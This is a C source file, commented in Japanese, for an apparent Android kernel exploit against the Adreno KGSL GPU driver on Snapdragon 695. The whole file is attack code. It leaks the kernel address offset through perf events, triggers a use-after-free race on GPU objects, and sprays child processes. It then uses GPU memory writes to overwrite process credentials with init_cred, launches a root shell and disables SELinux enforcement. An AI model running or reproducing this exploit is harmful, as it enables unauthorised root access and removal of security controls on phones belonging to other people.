

#include "avc_bypass.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <time.h>
#include <signal.h>
#include <poll.h>

static int kgsl_fd = -1;
static volatile int race_done = 0;
static uint64_t alloc_flags = 0;
static uint64_t uaf_gpuaddr = 0;

static void die(const char *msg) { perror(msg); exit(1); }

/* ========== PM4 パケット生成 ========== */
static uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}
static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}
#define CP_NOP 0x10
#define CP_MEM_WRITE 0x3D
static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
}

/* ========== KGSL 基本操作 ========== */
static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
    return a.id;
}
static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
}
static void *gpuobj_mmap(size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
    if (p == MAP_FAILED) die("gpuobj_mmap");
    return p;
}
static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0 && gpuaddr) *gpuaddr = inf.gpuaddr;
    return ret;
}
static unsigned int create_context(void) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}
static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}
static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object cmd_obj = {
        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB, .id = ib_id
    };
    struct kgsl_gpu_command gc = {0};
    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
    gc.cmdsize = sizeof(cmd_obj);
    gc.numcmds = 1;
    gc.context_id = ctx_id;
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

/* ========== コマンド実行 ========== */
static int run_cmd(uint32_t *cmd, int dwords,
                   uint64_t ib_ga, void *ib_m,
                   unsigned int ctx_id, unsigned int ib_id) {
    memcpy(ib_m, cmd, dwords * 4);
    __sync_synchronize();
    unsigned int ts;
    if (submit_ib(ctx_id, ib_ga, dwords * 4, ib_id, &ts) < 0) return -1;
    if (wait_timestamp(ctx_id, ts) < 0) return -2;
    __sync_synchronize();
    return 0;
}

/* ========== KASLR 検出（init_cred 取得用） ========== */
static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}
static uint64_t detect_kaslr(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;

    int fd = perf_open(&pe, 0, -1, -1, 0);
    if (fd < 0) return 0;

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;
    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_ip = 0;
    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            first_ip = *(uint64_t *)(hdr + 1);
            break;
        }
        tail += hdr->size;
    }
    munmap(buf, mmap_size);
    close(fd);
    if (first_ip == 0) return 0;
    return (first_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
}

/* ========== CP_MEM_WRITE ヘルパー ========== */
static void gpu_write_kernel(uint64_t va, uint64_t val,
                             uint64_t ib_ga, void *ib_m,
                             unsigned int ctx_id, unsigned int ib_id) {
    uint32_t cmd[16];
    int dw = 0;
    uint32_t lo, hi;
    split64(va, &lo, &hi);
    cmd[dw++] = cp_type7(CP_NOP, 0);
    cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
    cmd[dw++] = lo; cmd[dw++] = hi;
    split64(val, &lo, &hi);
    cmd[dw++] = lo; cmd[dw++] = hi;
    cmd[dw++] = cp_type7(CP_NOP, 0);
    if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) < 0) {
        fprintf(stderr, "gpu_write_kernel failed for va=0x%lx\n", va);
    }
}

/* ========== setenforce 0 ========== */
static int try_setenforce0(void) {
    int fd = open(AVC_ENFORCE_PATH, O_WRONLY);
    if (fd < 0) return 0;
    ssize_t w = write(fd, "0", 1);
    close(fd);
    return (w == 1);
}

/* ========== レーススレッド（gpuobj_alloc/free を連続実行） ========== */
static void *race_thread(void *arg) {
    while (!race_done) {
        int id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
        if (id >= 0) gpuobj_free(id);
        usleep(50);
    }
    return NULL;
}

/* ========== 子プロセススプレー ========== */
static pid_t spray_pids[SPRAY_PIDS];
static int n_spray = 0;

static void spawn_spray(int notify_pipe) {
    printf("[SPRAY] 子プロセスを %d 個生成中...\n", SPRAY_PIDS);
    for (int i = 0; i < SPRAY_PIDS; i++) {
        pid_t p = fork();
        if (p == 0) {
            prctl(PR_SET_NAME, "UAF_TASK");
            // 自分の uid が 0 になるまでチェック
            for (int j = 0; j < 600; j++) {
                if (getuid() == 0) {
                    write(notify_pipe, &p, sizeof(p));
                    // root になったらシェルを起動（このシェルで setenforce 0 を実行させる）
                    execl("/system/bin/sh", "sh", NULL);
                    _exit(0);
                }
                usleep(100000);
            }
            _exit(0);
        } else if (p > 0) {
            spray_pids[n_spray++] = p;
        } else {
            break;
        }
    }
    printf("[SPRAY] %d 個の子プロセスを生成完了\n", n_spray);
}

static void kill_spray_children(void) {
    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
    while (waitpid(-1, NULL, 0) > 0);
}

/* ========== メイン ========== */
int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf("[*] avc_bypass for Snapdragon 695 (Adreno 619) - 最終版\n");
    printf("[*] 戦略: UAF + task_struct->cred 書き換え → root 化 → setenforce 0\n");

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("[+] kgsl fd=%d\n", kgsl_fd);

    // KASLR 検出（init_cred アドレス取得）
    uint64_t kaslr = detect_kaslr();
    if (!kaslr) {
        printf("[-] KASLR 検出失敗\n");
        close(kgsl_fd);
        return 1;
    }
    printf("[+] KASLR = 0x%lx\n", kaslr);
    uint64_t init_cred_addr = kaslr + VMLINUX_INIT_CRED_OFFSET;
    printf("[*] init_cred = 0x%lx\n", init_cred_addr);

    // CPUマップなし（これが重要）
    alloc_flags = KGSL_CACHEMODE_WRITEBACK;

    // ---- Phase 1: 巨大オブジェクト確保 ----
    printf("[*] Phase 1: 巨大GPUオブジェクト (UAF_SIZE=0x%lx) を確保\n", UAF_SIZE);
    int uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
    gpuobj_info(uaf_id, &uaf_gpuaddr);
    printf("[+] 巨大オブジェクト id=%d gpuaddr=0x%lx\n", uaf_id, uaf_gpuaddr);

    // ---- Phase 2: 解放 ----
    printf("[*] Phase 2: 解放\n");
    gpuobj_free(uaf_id);
    printf("[+] 解放完了\n");

    // ---- Phase 3: メモリ回収 ----
    printf("[*] Phase 3: メモリ回収 (compact_memory, drop_caches)\n");
    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(10000);

    // ---- Phase 4: 通知用パイプ ----
    int pipefd[2];
    if (pipe(pipefd) < 0) die("pipe");
    fcntl(pipefd[0], F_SETFD, FD_CLOEXEC);
    fcntl(pipefd[1], F_SETFD, FD_CLOEXEC);

    // ---- Phase 5: 子プロセススプレー（task_struct を UAF 領域に配置） ----
    spawn_spray(pipefd[1]);
    close(pipefd[1]);

    // ---- Phase 6: レース（同じGPUアドレスを再利用） ----
    printf("[*] Phase 6: レース開始（GPUアドレス再利用を試行）\n");
    pthread_t thr;
    if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");

    int ov_id = -1;
    uint64_t ov_gpuaddr = 0;
    for (int attempt = 0; attempt < 500; attempt++) {
        ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
        if (ov_id < 0) { usleep(1000); continue; }
        gpuobj_info(ov_id, &ov_gpuaddr);
        if (ov_gpuaddr == uaf_gpuaddr) {
            printf("[+] 再利用成功！ attempt=%d, ov_gpuaddr=0x%lx\n", attempt, ov_gpuaddr);
            break;
        }
        gpuobj_free(ov_id);
        ov_id = -1;
        usleep(1000);
    }
    race_done = 1;
    pthread_join(thr, NULL);

    if (ov_id < 0) {
        printf("[-] 再利用失敗。終了します。\n");
        kill_spray_children();
        close(kgsl_fd);
        return 1;
    }

    // ---- Phase 7: GPU コンテキスト & IB 準備 ----
    printf("[*] Phase 7: GPU コンテキストと IB を準備\n");
    unsigned int ctx_id = create_context();
    int ib_id = gpuobj_alloc(0x10000, alloc_flags);
    void *ib_m = gpuobj_mmap(0x10000, ib_id);
    uint64_t ib_ga = 0;
    gpuobj_info(ib_id, &ib_ga);
    printf("[GPU] ctx=%u ib_ga=0x%lx\n", ctx_id, ib_ga);

    // ---- Phase 8: init_cred を広範囲に書き込む ----
    printf("[*] Phase 8: 再利用領域 (0x%lx) + 周辺 ±20ページ の全8バイトアラインアドレスに init_cred を書き込み\n", ov_gpuaddr);
    int writes = 0;
    for (int page_off = -20; page_off <= 20; page_off++) {
        uint64_t page_va = ov_gpuaddr + page_off * 0x1000;
        if (page_va < uaf_gpuaddr || page_va >= uaf_gpuaddr + UAF_SIZE) continue;
        // 各ページの 0x100 〜 0xFF8 を8バイト刻みで書き込み
        for (uint64_t off = 0x100; off < 0x1000; off += 8) {
            gpu_write_kernel(page_va + off, init_cred_addr, ib_ga, ib_m, ctx_id, ib_id);
            writes++;
        }
    }
    printf("[*] 総書き込み数: %d\n", writes);
    __sync_synchronize();
    usleep(100000);

    // ---- Phase 9: 子プロセスが root になるのを待つ ----
    printf("[*] Phase 9: root になった子プロセスを待機中...\n");
    struct pollfd pfd = { .fd = pipefd[0], .events = POLLIN };
    pid_t winner = 0;
    if (poll(&pfd, 1, 30000) > 0 && read(pipefd[0], &winner, sizeof(winner)) == sizeof(winner)) {
        printf("[+] root 獲得！ PID=%d\n", winner);
        // 他の子プロセスを殺す
        for (int i = 0; i < n_spray; i++) {
            if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
        }
        while (waitpid(-1, NULL, WNOHANG) > 0);
        // root シェルが起動するのを待つ（子プロセスは exec で sh になる）
        waitpid(winner, NULL, 0);
        // ここで setenforce 0 は子プロセスで実行されるので、親は何もしない
        printf("[+] root シェルが終了しました。\n");
    } else {
        printf("[-] タイムアウト: root になりませんでした。\n");
        kill_spray_children();
        close(kgsl_fd);
        return 1;
    }

    // ---- Phase 10: SELinux 状態確認 ----
    printf("[*] SELinux 状態確認:\n");
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd >= 0) {
        char v[8]; ssize_t n = read(fd, v, sizeof(v)-1);
        close(fd);
        if (n > 0) { v[n] = 0; printf("[*] getenforce: %s\n", v); }
    }

    // 子プロセスで setenforce 0 が実行されているはずだが、念のため親でも試す（root なら可能）
    if (try_setenforce0()) {
        printf("[+] SELinux permissive になりました！\n");
    } else {
        printf("[-] setenforce 0 に失敗しました（root シェルで手動実行が必要かもしれません）\n");
    }

    kill_spray_children();
    close(kgsl_fd);
    return 0;
}
